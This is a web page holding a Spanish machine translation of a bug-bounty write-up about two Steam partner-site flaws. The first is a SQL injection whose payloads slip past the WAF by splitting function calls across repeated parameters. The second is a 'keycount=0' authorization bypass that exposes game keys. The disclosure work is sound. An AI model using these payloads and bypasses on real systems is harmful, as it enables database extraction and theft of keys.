<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üç§ üë©üèæ‚Äçü§ù‚Äçüë®üèΩ ‚õ¥Ô∏è C√≥mo pirate√© Steam. Dos veces üëàüèæ üÖæÔ∏è üîª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hola Habr! Hoy les dir√© por qu√© Valve pag√≥ las mayores recompensas en la historia de su programa de recompensas por vulnerabilidades. ¬°Bienvenido a ca...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>C√≥mo pirate√© Steam. Dos veces</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/421215/">  Hola Habr!  Hoy les dir√© por qu√© Valve pag√≥ las mayores recompensas en la historia de su programa de recompensas por vulnerabilidades.  ¬°Bienvenido a cat! <br><br><img src="https://habrastorage.org/webt/6j/zb/jq/6jzbjqwm54kjaonciarskoos0fi.png"><br><a name="habracut"></a><br><h3>  1. Inyecci√≥n SQL </h3><br>  El servicio <i>partner.steampowered.com</i> est√° dise√±ado para recibir informaci√≥n financiera de los socios de Steam.  En la p√°gina del informe de ventas, se dibuja un gr√°fico con botones que cambian el per√≠odo en que se muestran las estad√≠sticas.  Aqu√≠ est√°n en el rect√°ngulo verde: <br><br><img src="https://habrastorage.org/webt/kx/sv/rr/kxsvrry7aicwzjut5chb_j2exhg.png"><br><br>  La solicitud de descarga de estad√≠sticas se ve as√≠: <br><br><img src="https://habrastorage.org/webt/vb/26/vy/vb26vydaudwl7rcusm0vyjnek14.png"><br>  <i>donde "UA" es el c√≥digo del pa√≠s.</i> <br><br>  Bueno, ¬°es hora de cotizaciones! <br>  Probemos con "UA": <br><br><img src="https://habrastorage.org/webt/7s/xu/fp/7sxufpkpcieqwxldj8yuklhui2g.png"><br><br>  Las estad√≠sticas NO regresaron, lo cual es de esperar. <br><br>  Ahora "UA" ": <br><br><img src="https://habrastorage.org/webt/f9/pz/pm/f9pzpmv4lem2283_qopey71x69k.png"><br><br>  ¬°Las estad√≠sticas han vuelto y parece una inyecci√≥n! <br><br><div class="spoiler">  <b class="spoiler_title">Por qu√©</b> <div class="spoiler_text">  Digamos que la instrucci√≥n de la base de datos se ve as√≠: <br><br><pre><code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span>;</code> </pre> <br>  Si env√≠a UA ', la instrucci√≥n de la base de datos ser√°: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span><span class="hljs-string"><span class="hljs-string">`;</span></span></code> </pre> <br>  ¬øNot√≥ una cotizaci√≥n extra?  Y esto significa que la instrucci√≥n no es v√°lida. <br>  De acuerdo con la sintaxis de SQL, la siguiente consulta es completamente v√°lida (no hay comillas adicionales): <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span><span class="hljs-string"><span class="hljs-string">``</span></span>;</code> </pre> </div></div><br>  Tenga en cuenta que estamos tratando con una variedad de <b>countryFilter []</b> .  Supuse que si <b>duplicamos el</b> par√°metro <b>countryFilter []</b> en la consulta varias veces, todos los valores que enviamos se combinar√°n en la consulta SQL de esta manera: <br><br><pre> <code class="sql hljs">'value1', 'value2', 'value3'</code> </pre> <br>  Verificamos y nos aseguramos de: <br><br><img src="https://habrastorage.org/webt/tm/t0/ub/tmt0ubgrptaw2iy8gfxwqwkqvnm.png"><br><br>  De hecho, solicitamos estad√≠sticas de tres pa√≠ses de la base de datos: <br><br><pre> <code class="sql hljs">`UA`, `,` ,`RU`</code> </pre> <br>  La sintaxis es correcta: las estad√≠sticas han vuelto :) <br><br>  <b>Bypass de firewall de aplicaciones web</b> <br><br>  Los servidores de Steam se esconden detr√°s de Akamai WAF.  Esta desgracia inserta palos en las ruedas de buenos (y no tan) hackers.  Sin embargo, pude superarlo combinando los valores de la matriz en una consulta (lo que expliqu√© anteriormente) y comentando.  Primero, aseg√∫rese de que este √∫ltimo est√© disponible: <br><br><pre> <code class="hljs powershell">?countryFilter[]=UA`/*&amp;countryFilter[]=*/,`RU</code> </pre> <br>  La solicitud es v√°lida, por lo que hay comentarios en nuestro surtido. <br><blockquote>  Ten√≠amos varias opciones de sintaxis, bases de datos locales para probar cargas √∫tiles, caracteres de comentarios y un n√∫mero infinito de citas para todas las codificaciones, as√≠ como scripts escritos en Python, documentaci√≥n para todas las bases de datos, instrucciones sobre c√≥mo evitar los firewalls, wikipedia y antichest.  No es que fuera una reserva necesaria para la promoci√≥n de la inyecci√≥n, pero desde que comenz√≥ a romper la base de datos, es dif√≠cil detenerla ... </blockquote>  WAF bloquea una solicitud cuando encuentra una funci√≥n en ella.  ¬øSab√≠a que <b>DB_NAME</b> / ** / <b>()</b> es una llamada de funci√≥n v√°lida?  El firewall tambi√©n sabe y bloquea.  Pero, gracias a esta caracter√≠stica, ¬°podemos dividir la llamada a la funci√≥n en dos par√°metros! <br><br><pre> <code class="hljs scala">?countryFilter[]=<span class="hljs-type"><span class="hljs-type">UA</span></span>',<span class="hljs-type"><span class="hljs-type">DB_NAME</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>(),<span class="hljs-symbol"><span class="hljs-symbol">'RU</span></span></code> </pre> <br>  Enviamos una solicitud con <b>DB_NAME</b> / * de <i>todos modos</i> * / <b>()</b> - WAF no entendi√≥ nada, pero la base de datos proces√≥ con √©xito dicha instrucci√≥n. <br><br>  <b>Recuperando valores de una base de datos</b> <br><br>  Entonces, un ejemplo de c√≥mo obtener la longitud de un valor DB_NAME (): <br><br><pre> <code class="hljs sql">https://partner.steampowered.com/report_xml.php?query=QuerySteamHistory&amp;countryFilter[]=',(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">CASE</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">WHEN</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">len</span></span>(DB_NAME<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>())<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>)<span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">THEN</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-string"><span class="hljs-string">'UA'</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">ELSE</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span><span class="hljs-string"><span class="hljs-string">'qwerty'</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">END</span></span>),<span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  En SQL: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">CASE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">WHEN</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">len</span></span>(DB_NAME())= <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">THEN</span></span> <span class="hljs-string"><span class="hljs-string">'UA'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ELSE</span></span> <span class="hljs-string"><span class="hljs-string">'qwerty'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">END</span></span></code> </pre> <br>  Bueno, humanamente: <br><br><pre> <code class="sql hljs">  DB_NAME()  "1",   ‚ÄúUA‚Äù,   ‚Äúqwerty‚Äù.</code> </pre> <br>  Esto significa que si la comparaci√≥n es verdadera, a cambio obtenemos estad√≠sticas para el pa√≠s "UA".  No es dif√≠cil adivinar que si revisamos los valores del 1 al infinito, tarde o temprano encontraremos el correcto. <br><br>  Del mismo modo, puede iterar sobre valores de texto: <br><br><pre> <code class="sql hljs">   DB_NAME()  ‚Äúa‚Äù,  "UA",  "qwerty".</code> </pre> <br>  Por lo general, la funci√≥n de "subcadena" se utiliza para obtener el en√©simo car√°cter, pero WAF lo bloque√≥ obstinadamente.  Aqu√≠ la combinaci√≥n vino al rescate: <br><br><pre> <code class="sql hljs">right(left(system_user,N),1)</code> </pre> <br>  Como funciona  Obtenemos N caracteres del valor de system_user del que tomamos el √∫ltimo. <br>  Imagine que system_user = "steam".  As√≠ es como se ver√° el tercer personaje: <br><br><pre> <code class="sql hljs">left(system_user,3) = ste right(‚Äúste‚Äù,1) = e</code> </pre> <br>  Con un script simple, este proceso se automatiz√≥ y obtuve el nombre de host, system_user, versi√≥n y los nombres de todas las bases de datos.  Esta informaci√≥n es m√°s que suficiente (esta √∫ltima es incluso superflua, pero fue interesante) para demostrar la criticidad. <br><br>  Despu√©s de 5 horas, la vulnerabilidad se solucion√≥, pero el estado de triaged se estableci√≥ despu√©s de 8 horas y, maldita sea, para m√≠ fue muy dif√≠cil 3 horas por las cuales mi cerebro logr√≥ sobrevivir a las etapas desde la negaci√≥n hasta la aceptaci√≥n. <br><br><div class="spoiler">  <b class="spoiler_title">Explicaci√≥n de la paranoia.</b> <div class="spoiler_text">  Como la vulnerabilidad no fue designada como aceptada, cre√≠ que la l√≠nea a√∫n no hab√≠a llegado a mi informe.  Pero arreglaron el error, lo que significa que podr√≠an haberlo registrado antes que yo. <br></div></div><br><h3>  2. Obtener todas las claves de cualquier juego. </h3><br>  En la interfaz de socio de Steam, hay una funcionalidad para generar claves de juego. <br>  Puede descargar el conjunto de claves generado utilizando la solicitud: <br><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/partner.steamgames.com/partnercdkeys</span></span><span class="hljs-regexp"><span class="hljs-regexp">/assignkeys/</span></span> &amp;sessionid=xxxxxxxxxxxxx&amp;keyid=<span class="hljs-number"><span class="hljs-number">123456</span></span>&amp;sourceAccount=xxxxxxxxx&amp;appid=xxxxxx&amp;keycount=<span class="hljs-number"><span class="hljs-number">1</span></span>&amp;generateButton=Download</code> </pre> <br>  En esta solicitud, el par√°metro <b>keyid</b> es la identificaci√≥n del conjunto de claves, y el n√∫mero de claves es el n√∫mero de claves que se deben obtener de este conjunto. <br><br>  Por supuesto, mis manos se extendieron instant√°neamente para conducir con diferente <b>keyid</b> , pero me esperaba un error: "No se <i>pudieron generar claves de CD: no hay asignaci√≥n para el usuario".</i>  ".  Result√≥ que no todo era tan simple, y Steam verific√≥ si pose√≠a el juego de llaves solicitado.  ¬øC√≥mo llegu√© a esta prueba?  Atenci√≥n ... <br><br><pre> <code class="hljs">keycount=0</code> </pre> <br>  Se gener√≥ un archivo con 36,000 claves para el juego Portal 2. Wow. <br>  Solo en un conjunto estaba este n√∫mero de teclas.  Y todos los sets en este momento m√°s de 430,000.  Por lo tanto, clasificando los valores de <b>keyid,</b> <s>fui un</s> atacante potencial que podr√≠a descargar todas las claves generadas por los desarrolladores de juegos de Steam. <br><br><h3>  Conclusiones </h3><br><ul><li>  Los costosos sistemas WAF de las principales compa√±√≠as est√°n lejos de garantizar la seguridad de sus aplicaciones web. </li><li>  Si eres un cazador de insectos, intenta penetrar lo m√°s profundo posible.  Mientras menos usuarios tengan acceso a una interfaz, es m√°s probable que encuentre una vulnerabilidad en esa interfaz. </li><li>  Desarrolladores y due√±os de negocios, ¬°no hay aplicaciones absolutamente seguras!  Pero espera.  Que tengas buen humor! <br></li></ul><br><div class="spoiler">  <b class="spoiler_title">Pero en serio</b> <div class="spoiler_text">  Haga pentests, pague por vulnerabilidades, piense estrat√©gicamente. <br></div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es421215/">https://habr.com/ru/post/es421215/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es421205/index.html">1 de septiembre, hace 110 a√±os: trigonometr√≠a, tipo de cambio del d√≥lar y bengalas</a></li>
<li><a href="../es421207/index.html">Situaci√≥n: dos vulnerabilidades en la pila TCP del kernel de Linux est√°n cerradas</a></li>
<li><a href="../es421209/index.html">IaaS en el comercio electr√≥nico y el sector financiero: qui√©n y por qu√© se cambi√≥ a la infraestructura virtual</a></li>
<li><a href="../es421211/index.html">PowerShell y Preferencias de directiva de grupo cuando las impresoras cuentan hasta cientos</a></li>
<li><a href="../es421213/index.html">DJI Mavic 2 Pro / Zoom en detalles</a></li>
<li><a href="../es421217/index.html">Soporte de Python en Power BI</a></li>
<li><a href="../es421221/index.html">Terapia severa: cura para MacOS</a></li>
<li><a href="../es421223/index.html">DevFest SPB 2018</a></li>
<li><a href="../es421225/index.html">Diagn√≥stico SENS. Biomarcadores de disfunci√≥n mitocondrial y estr√©s oxidativo</a></li>
<li><a href="../es421227/index.html">Descripci√≥n general de los marcos de desarrollo m√≥vil multiplataforma</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>